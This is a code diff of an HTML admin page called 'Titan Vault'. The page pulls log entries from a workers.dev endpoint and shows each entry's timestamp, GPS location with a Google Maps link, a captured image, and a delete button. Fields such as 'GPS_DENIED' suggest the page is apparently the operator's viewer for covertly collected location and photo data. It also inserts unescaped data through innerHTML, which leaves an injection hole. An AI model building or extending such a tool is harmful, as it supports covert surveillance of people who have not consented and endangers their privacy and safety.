@@ -1,36 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Titan Vault</title>
+    <title>Titan Vault | Admin</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .card { border: 1px solid #333; margin-bottom: 30px; padding: 10px; background: #111; }
-        img { width: 100%; max-width: 500px; border: 1px solid #0f0; margin: 10px 0; }
-        .gps-link { color: #00ff88; text-decoration: none; border-bottom: 1px dashed; }
+        .log-card { border: 1px solid #333; margin-bottom: 25px; padding: 15px; background: #0a0a0a; border-radius: 5px; position: relative; }
+        img { width: 100%; max-width: 400px; border: 1px solid #0f0; margin-top: 10px; }
+        .meta { font-size: 0.8rem; color: #888; }
+        .btn-group { margin-top: 10px; display: flex; gap: 10px; }
+        .btn { padding: 5px 10px; border: 1px solid #0f0; color: #0f0; text-decoration: none; font-size: 0.7rem; cursor: pointer; background: transparent; }
+        .del-btn { border-color: #ff4444; color: #ff4444; }
+        .del-btn:hover { background: #ff4444; color: #fff; }
     </style>
 </head>
 <body>
-    <h1>TITAN CLOUD VAULT</h1>
-    <div id="logs">Loading logs...</div>
+    <h1>TITAN SECURE VAULT</h1>
+    <div id="logs">SYNCING DATA...</div>
 
     <script>
-        async function load() {
-            const res = await fetch("https://titan-logger.saliljha523.workers.dev");
+        const API = "https://titan-logger.saliljha523.workers.dev";
+
+        async function fetchLogs() {
+            const res = await fetch(API);
             const data = await res.json();
-            document.getElementById('logs').innerHTML = data.map(item => {
+            const container = document.getElementById('logs');
+            
+            if (data.length === 0) {
+                container.innerHTML = "VAULT EMPTY.";
+                return;
+            }
+
+            container.innerHTML = data.map(item => {
                 const gps = item.location.split('GPS: ')[1];
-                const mapsLink = gps && gps !== 'GPS_DENIED' ? `https://www.google.com/maps?q=${gps}` : '#';
+                const mapsUrl = (gps && gps !== 'N/A') ? `https://www.google.com/maps?q=${gps}` : "#";
+
                 return `
-                <div class="card">
-                    <div>TIME: ${item.timestamp}</div>
-                    <div>LOC: ${item.location} 
-                        ${gps !== 'GPS_DENIED' ? `<a href="${mapsLink}" target="_blank" class="gps-link">[OPEN MAPS]</a>` : ''}
+                    <div class="log-card" id="card-${item.id}">
+                        <div class="meta">
+                            ID: ${item.id} | ${new Date(item.timestamp).toLocaleString()}<br>
+                            LOC: ${item.location}
+                        </div>
+                        <img src="${item.image}">
+                        <div class="btn-group">
+                            ${gps !== 'N/A' ? `<a href="${mapsUrl}" target="_blank" class="btn">GOOGLE MAPS</a>` : ''}
+                            <button class="btn del-btn" onclick="deleteEntry(${item.id})">DELETE DATA</button>
+                        </div>
                     </div>
-                    <img src="${item.image}">
-                </div>`;
+                `;
             }).join('');
         }
-        load();
+
+        async function deleteEntry(id) {
+            if (!confirm("Permanently delete this entry?")) return;
+            
+            try {
+                const res = await fetch(API, {
+                    method: 'DELETE',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: id })
+                });
+
+                if (res.ok) {
+                    document.getElementById(`card-${id}`).remove();
+                }
+            } catch (e) {
+                alert("Delete failed: " + e.message);
+            }
+        }
+
+        fetchLogs();
     </script>
 </body>
 </html>
